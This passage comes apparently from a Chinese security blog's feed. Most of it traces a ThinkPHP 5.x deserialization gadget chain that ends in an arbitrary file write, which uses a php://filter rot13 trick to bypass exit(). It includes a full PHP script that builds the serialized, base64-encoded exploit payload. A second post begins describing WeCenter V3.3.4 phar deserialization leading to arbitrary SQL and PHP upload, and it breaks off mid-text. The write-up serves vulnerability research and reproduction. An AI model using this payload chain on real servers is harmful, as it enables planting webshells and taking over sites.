class="keyword">new</span> BadMethodCallException(<span class="string">'method not exists:'</span> . get_class($modelRelation) . <span class="string">'-&gt; getRelation'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里我们注意下<code>$modelRelation</code>参数，他的值由<code>$modelRelation = $this-&gt;$relation();</code>这句得到，<code>$relation</code>值由<code>$name</code>决定，<code>$name</code>值由<code>$this-&gt;append</code>决定，是可控的，那么这里我们就可以调用我们可控的方法，这里选择<code>Modle</code>类中的<code>getError</code>方法,因为其返回值直接可控</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getError</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里<code>$modelRelation</code>就是完全可控的，在<code>getRelationData</code>方法中，执行到<code>$value = $modelRelation-&gt;getRelation();</code>时，就可以执行任意类的<code>getRelation</code>方法，这里选择位于<code>thinkphp/library/think/model/relation/HasOne.php</code>的<code>HasOne</code>类的<code>getRelation</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span><span class="params">($subRelation = <span class="string">''</span>, $closure = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 执行关联定义方法</span></span><br><span class="line">    $localKey = <span class="keyword">$this</span>-&gt;localKey;</span><br><span class="line">    <span class="keyword">if</span> ($closure) &#123;</span><br><span class="line">        call_user_func_array($closure, [ &amp; <span class="keyword">$this</span>-&gt;query]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断关联类型执行查询</span></span><br><span class="line">    $relationModel = <span class="keyword">$this</span>-&gt;query</span><br><span class="line">        -&gt;removeWhereField(<span class="keyword">$this</span>-&gt;foreignKey)</span><br><span class="line">        -&gt;where(<span class="keyword">$this</span>-&gt;foreignKey, <span class="keyword">$this</span>-&gt;parent-&gt;$localKey)</span><br><span class="line">        -&gt;relation($subRelation)</span><br><span class="line">        -&gt;find();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($relationModel) &#123;</span><br><span class="line">        $relationModel-&gt;setParent(<span class="keyword">clone</span> <span class="keyword">$this</span>-&gt;parent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $relationModel;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关注如下代码段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$relationModel = <span class="keyword">$this</span>-&gt;query</span><br><span class="line">            -&gt;removeWhereField(<span class="keyword">$this</span>-&gt;foreignKey)</span><br><span class="line">            -&gt;where(<span class="keyword">$this</span>-&gt;foreignKey, <span class="keyword">$this</span>-&gt;parent-&gt;$localKey)</span><br><span class="line">            -&gt;relation($subRelation)</span><br><span class="line">            -&gt;find();</span><br></pre></td></tr></table></figure><p>这里<code>$this-&gt;query</code>可控，<code>$this-&gt;foreignKey</code>可控，这样就可以触发任意不存在<code>removeWhereField</code>方法的类的<code>__call</code>方法，这里选择触发位于<code>thinkphp/library/think/console/Output.php</code>的<code>Output</code>类的<code>__call</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        var_dump($args);</span><br><span class="line">        <span class="keyword">if</span> (in_array($method, <span class="keyword">$this</span>-&gt;styles)) &#123;</span><br><span class="line">            array_unshift($args, $method);<span class="comment">//$args-&gt;class Relation-&gt;$foreignKey</span></span><br><span class="line">            <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>, <span class="string">'block'</span>], $args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;handle &amp;&amp; method_exists(<span class="keyword">$this</span>-&gt;handle, $method)) &#123;</span><br><span class="line">            <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>-&gt;handle, $method], $args);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'method not exists:'</span> . <span class="keyword">__CLASS__</span> . <span class="string">'-&gt;'</span> . $method);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着由于<code>return call_user_func_array([$this, &#39;block&#39;], $args);</code>会触发<code>block</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">block</span><span class="params">($style, $message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;writeln(<span class="string">"&lt;&#123;$style&#125;&gt;&#123;$message&#125;&lt;/$style&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>writeln</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeln</span><span class="params">($messages, $type = self::OUTPUT_NORMAL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;write($messages, <span class="keyword">true</span>, $type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>write</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($messages, $newline = false, $type = self::OUTPUT_NORMAL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;handle-&gt;write($messages, $newline, $type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<code>$this-&gt;handle</code>可控，我们又可以实现对任意类的<code>write</code>方法的调用，这里选择位于<code>think/session/driver/Memcache.php</code>的<code>Memcache</code>类的<code>write</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($sessID, $sessData)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;handler-&gt;set(<span class="keyword">$this</span>-&gt;config[<span class="string">'session_name'</span>] . $sessID, $sessData, <span class="keyword">$this</span>-&gt;config[<span class="string">'expire'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样的<code>$this-&gt;handler</code>可控，这样我们可以调用其他类的<code>set</code>方法，这里选择位于<code>thinkphp/library/think/cache/driver/File.php</code>的<code>File</code>类的<code>set</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value, $expire = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">'expire'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($expire <span class="keyword">instanceof</span> \DateTime) &#123;</span><br><span class="line">        $expire = $expire-&gt;getTimestamp() - time();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name, <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;tag &amp;&amp; !is_file($filename)) &#123;</span><br><span class="line">        $first = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $data = serialize($value);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'data_compress'</span>] &amp;&amp; function_exists(<span class="string">'gzcompress'</span>)) &#123;</span><br><span class="line">        <span class="comment">//数据压缩</span></span><br><span class="line">        $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $data   = <span class="string">"&lt;?php\n//"</span> . sprintf(<span class="string">'%012d'</span>, $expire) . <span class="string">"\n exit();?&gt;\n"</span> . $data;</span><br><span class="line">    $result = file_put_contents($filename, $data);</span><br><span class="line">    <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">        <span class="keyword">isset</span>($first) &amp;&amp; <span class="keyword">$this</span>-&gt;setTagItem($filename);</span><br><span class="line">        clearstatcache();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这也是该链写文件的部分，看一下<code>file_put_contents($filename, $data);</code>的两个参数</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span> = <span class="variable">$this</span>-&gt;getCacheKey(<span class="variable">$name</span>, <span class="keyword">true</span>);</span><br><span class="line"><span class="variable">$data</span> = serialize(<span class="variable">$value</span>);</span><br></pre></td></tr></table></figure><p>先看<code>$filename</code>，跟进<code>getCacheKey</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span><span class="params">($name, $auto = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $name = md5($name);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'cache_subdir'</span>]) &#123;</span><br><span class="line">        <span class="comment">// 使用子目录</span></span><br><span class="line">        $name = substr($name, <span class="number">0</span>, <span class="number">2</span>) . DS . substr($name, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>]) &#123;</span><br><span class="line">        $name = <span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>] . DS . $name;</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = <span class="keyword">$this</span>-&gt;options[<span class="string">'path'</span>] . $name . <span class="string">'.php'</span>;</span><br><span class="line">    $dir      = dirname($filename);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($auto &amp;&amp; !is_dir($dir)) &#123;</span><br><span class="line">        mkdir($dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $filename;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$filename</code>是由<code>$this-&gt;options[&#39;path&#39;]</code>和<code>$name</code>组成的，是可控的，那么<code>$filename</code>就是可控的，其中md5值我们可以自己算出来</p><p>然后看一下<code>$data</code>，其值由<code>$value</code>决定，向上回溯会发现，该值的类型是布尔类型，也就是说我们在此处无法控制<code>$data</code>的值，那么目前我们无法写任意<code>shell</code>，于是接着回到<code>set</code>方法中，注意到该条语句<code>$this-&gt;setTagItem($filename);</code>，跟进<code>setTagItem</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">setTagItem</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;tag) &#123;</span><br><span class="line">        $key       = <span class="string">'tag_'</span> . md5(<span class="keyword">$this</span>-&gt;tag);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tag = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;has($key)) &#123;</span><br><span class="line">            $value   = explode(<span class="string">','</span>, <span class="keyword">$this</span>-&gt;get($key));</span><br><span class="line">            $value[] = $name;</span><br><span class="line">            $value   = implode(<span class="string">','</span>, array_unique($value));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = $name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;set($key, $value, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法中最后重新调用了<code>set</code>方法，其中<code>$key  = &#39;tag_&#39; . md5($this-&gt;tag);</code>中<code>$this-&gt;tag</code>可控，则<code>$key</code>可控，而<code>$value = $name</code>，<code>$name</code>是刚刚的<code>$filename</code>，那么<code>$value</code>也是可控的，在此我们在这里再次调用<code>set</code>方法，同时也能完全控制写入的文件名和文件内容，在写入文件内容时可以注意到如下语句</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data   = <span class="string">"&lt;?php\n//"</span> . <span class="keyword">sprintf</span>(<span class="string">'%012d'</span>, $expire) . <span class="string">"\n exit();?&gt;\n"</span> . $data;</span><br></pre></td></tr></table></figure><p>我们需要消除该处<code>exit()</code>方法的限制，这里我们可以使用<code>伪协议+rot13</code>编码绕过</p><h2 id="payload编写-2"><a href="#payload编写-2" class="headerlink" title="payload编写"></a>payload编写</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcached</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $handler = <span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler = <span class="keyword">new</span> File();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Driver</span></span>&#123;</span><br><span class="line">    <span class="comment">//protected $tag;</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//$this-&gt;tag = 'nocatch';</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">Driver</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> <span class="keyword">extends</span> <span class="title">Driver</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $tag;</span><br><span class="line">    <span class="keyword">protected</span> $options = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tag = <span class="string">'nocatch'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options = [</span><br><span class="line">            <span class="string">'cache_subdir'</span>=&gt;<span class="keyword">false</span>,</span><br><span class="line">            <span class="string">'prefix'</span>=&gt;<span class="string">''</span>,</span><br><span class="line">            <span class="string">'path'</span>=&gt;<span class="string">'php://filter/write=string.rot13/resource=./static/&lt;?cuc cucvasb();?&gt;'</span>,</span><br><span class="line">            <span class="string">'data_compress'</span>=&gt;<span class="keyword">false</span>,</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $handle = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">protected</span> $styles = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;styles = [<span class="string">'removeWhereField'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Memcached();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Relation</span></span>&#123;</span><br><span class="line">      <span class="keyword">protected</span> $query;</span><br><span class="line">      <span class="keyword">protected</span> $foreignKey;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;query = <span class="keyword">new</span> Output();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;foreignKey = <span class="string">"aaaaaaaaa"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Relation</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">OneToOne</span> <span class="keyword">extends</span> <span class="title">Relation</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HasOne</span> <span class="keyword">extends</span> <span class="title">OneToOne</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasOne</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $append = [];</span><br><span class="line">    <span class="keyword">protected</span> $error;</span><br><span class="line">    <span class="keyword">protected</span> $parent;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">'yemoli'</span>=&gt;<span class="string">'getError'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error = <span class="keyword">new</span> HasOne();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="参考链接-2"><a href="#参考链接-2" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://www.anquanke.com/post/id/196364an" target="_blank" rel="noopener">https://www.anquanke.com/post/id/196364an</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;5-1-x&quot;&gt;&lt;a href=&quot;#5-1-x&quot; class=&quot;headerlink&quot; title=&quot;5.1.x&quot;&gt;&lt;/a&gt;5.1.x&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;测试环境&lt;/p&gt;
&lt;p&gt;tp5.1.35&lt;/p&gt;
&lt;p&gt;php7.0.9&lt;/p&gt;
&lt;/bl
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="https://yml-sec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>WeCenter V3.3.4漏洞复现</title>
    <link href="https://yml-sec.top/2020/02/29/WeCenter-V3-3-4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://yml-sec.top/2020/02/29/WeCenter-V3-3-4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-02-29T10:23:14.000Z</published>
    <updated>2020-03-01T05:33:50.003Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>该漏洞的实质触发原因是由于可以通过反序列化来执行任意<code>sql</code>语句，导致可以在数据库中更改上传文件的限制类型，最后达到可以上传任意<code>PHP</code>文件的效果</p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>漏洞利用点文件位置在<code>./system/aws_model.inc.php</code>，该文件中存在一个<code>AWS_MODEL</code>类，重点关注一下该类的<code>__destruct</code>方法</p><p><img src="/2020/02/29/WeCenter-V3-3-4漏洞复现/1.png" alt="1"></p><p>该方法遍历了<code>$_shutdown_query</code>，然后执行了query方法，跟进去看一下</p><p><img src="/2020/02/29/WeCenter-V3-3-4漏洞复现/2.png" alt="2"></p><p>该方法的功能是执行传入的<code>SQL</code>语句，那么也就是说我们只要控制了<code>$_shutdown_query</code>就可以执行任意的语句了，可以注意到该变量是该类中的私有成员变量</p><p><img src="/2020/02/29/WeCenter-V3-3-4漏洞复现/3.png" alt="3"></p><p>如果存在反序列化的点，我们就可以控制<code>$_shutdown_query</code>的值来执行任意<code>SQL</code>语句，于是接着来寻找反序列化的触发方法</p><p>在本例中反序列化是利用<code>phar</code>进行触发的，触发点文件在<code>./models/account.php</code>，在该文件的<code>account_class</code>类中，存在着这样一个函数</p><p><img src="/2020/02/29/WeCenter-V3-3-4漏洞复现/4.png" alt="4"></p><p>如果该函数中的<code>$headimgurl</code>是可控的，就可以通过<code>file_get_contents</code>函数来触发<code>phar</code>反序列化，通过搜索发现在<code>./app/account/ajax.php</code>中的<code>synch_img_action</code>函数调用了<code>associate_remote_avatar</code>函数</p><p><img 